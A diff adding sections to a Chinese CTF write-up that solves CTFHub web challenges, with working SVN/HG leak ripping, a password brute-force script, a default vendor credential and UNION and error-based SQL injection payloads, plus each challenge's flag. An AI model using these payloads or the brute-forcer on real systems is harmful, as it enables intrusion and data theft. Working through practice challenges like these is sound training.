@@ -442,3 +442,150 @@ ctfhub{4810073b50315a6ad0ca5286}
 flag: `ctfhub{4810073b50315a6ad0ca5286}`
 
 ### SVN 泄露
+
+这年头谁还用 svn 啊，直接工具一把梭了：
+
+[kost/dvcs-ripper: Rip web accessible (distributed) version control systems: SVN/GIT/HG...](https://github.com/kost/dvcs-ripper)
+
+就是安装太麻烦了，可以考虑 docker 跑一个 ubuntu，然后跟着 readme 的指引安装使用就好了
+
+```bash
+$ docker run --rm -it ubuntu bash
+
+root@b0517fda18c5:/# apt update
+
+root@b0517fda18c5:/# apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl git subversion
+
+root@b0517fda18c5:/# git clone https://github.com/kost/dvcs-ripper
+
+root@b0517fda18c5:/dvcs-ripper# perl rip-svn.pl -v -u "http://challenge-d3a8103b9278a2d1.sandbox.ctfhub.com:10800/.svn/"
+
+root@b0517fda18c5:/dvcs-ripper# grep -r ctfhub .svn
+.svn/pristine/5e/5e8116795a635d1aff2c9460af57aa68ee02a77e.svn-base:ctfhub{665c9072041c4e31608e32a6}
+grep: .svn/wc.db: binary file matches
+```
+
+flag: `ctfhub{665c9072041c4e31608e32a6}`
+
+### HG 泄露
+
+```bash
+root@b0517fda18c5:/dvcs-ripper# perl rip-hg.pl -v -s -u "http://challenge-997bd931f11fecef.sandbox.ctfhub.com:10800/.hg/"
+
+root@b0517fda18c5:/dvcs-ripper# grep -r flag .hg/
+grep: .hg/dirstate: binary file matches
+grep: .hg/store/00manifest.i: binary file matches
+grep: .hg/store/undo: binary file matches
+.hg/store/fncache:data/flag_370518041.txt.i
+grep: .hg/undo.dirstate: binary file matches
+.hg/last-message.txt:add flag
+
+$ curl "http://challenge-997bd931f11fecef.sandbox.ctfhub.com:10800/flag_370518041.txt"
+ctfhub{9a264f20c5f7724a0b509f9e}
+```
+
+flag: `ctfhub{9a264f20c5f7724a0b509f9e}`
+
+### 弱口令
+
+跑了一下 top100 的密码本没跑出来，网上查了一下密码是 `admin888`。。。浓厚的老中味道
+
+```python
+import requests
+import typing
+
+wordlist_url = "https://raw.githubusercontent.com/kkrypt0nn/wordlists/refs/heads/main/wordlists/passwords/top_adobe_passwords.txt"
+
+wordlist: typing.List[str] = [
+    _ for _ in requests.get(wordlist_url).text.split("\n") if _ is not ''
+]
+
+for mpass in wordlist:
+    if mpass == '': continue
+    print(f"Trying: {mpass}")
+    resp = requests.post(
+        "http://challenge-cd89dd0061a2c67c.sandbox.ctfhub.com:10800/",
+        data={
+            'name': 'admin',
+            'password': mpass
+        }
+    )
+    if "user or password is wrong" not in resp.text:
+        print(resp.headers)
+        print(resp.text)
+        break
+```
+
+flag: `ctfhub{605839de08da6a3d58c873de}`
+
+###  默认密码
+
+😅网上找默认密码：`eyougw:admin@(eyou)`
+
+flag: `ctfhub{690a50ae1d710046a37bbfa5}`
+
+### 整数型注入
+
+查询有哪些数据库：
+```
+-1 union select group_concat(schema_name), 2 from information_schema.schemata
+```
+
+查询 `sqli` 数据库下有哪些表：
+```
+-1 union select group_concat(table_name), 2 from information_schema.tables where table_schema = 'sqli'
+```
+
+查询 `sqli` 数据库下 flag 表中有哪些字段：
+```
+-1 union select group_concat(column_name), 2 from information_schema.columns where table_schema = 'sqli' and table_name = 'flag'
+```
+
+查询 `sqli` 数据库下 flag 表中，`flag` 字段的所有行
+```
+-1 union select group_concat(flag), 2 from flag
+```
+
+flag: `ctfhub{d9e2564dbd5ea3452e0cb73f}`
+
+### 字符型注入
+
+跟上一题没什么区别，只要注意引号对称就可以了
+
+查询有哪些数据库：
+```
+-1' union select group_concat(schema_name), 2 from information_schema.schemata where '1'='1
+```
+
+查询 `sqli` 数据库下有哪些表：
+```
+-1' union select group_concat(table_name), 2 from information_schema.tables where table_schema='sqli
+```
+
+查询 `sqli` 数据库下 `flag` 表中，有哪些字段
+```
+-1' union select group_concat(column_name), 2 from information_schema.columns where table_schema='sqli' and table_name='flag
+```
+
+查询 `sqli` 数据库下 flag 表中，`flag` 字段的所有行
+```
+-1' union select group_concat(flag), 2 from flag where '1'='1
+```
+
+flag: `ctfhub{f79bdfdfaaf2bbc506f193fa}`
+
+### 报错注入
+
+使用 `updatexml` 构造报错
+```
+-1 union select updatexml(1, concat(0x7e, (select group_concat(flag) from flag), 0x7e), 1), 2
+```
+
+但疑似 flag 较长会被截断，保险一点分两次读：
+```
+-1 union select updatexml(1, concat(0x7e, (select substring(group_concat(flag), 1, 10) from flag), 0x7e), 1), 2
+```
+
+```
+-1 union select updatexml(1, concat(0x7e, (select substring(group_concat(flag), 21, 20) from flag), 0x7e), 1), 2
+```
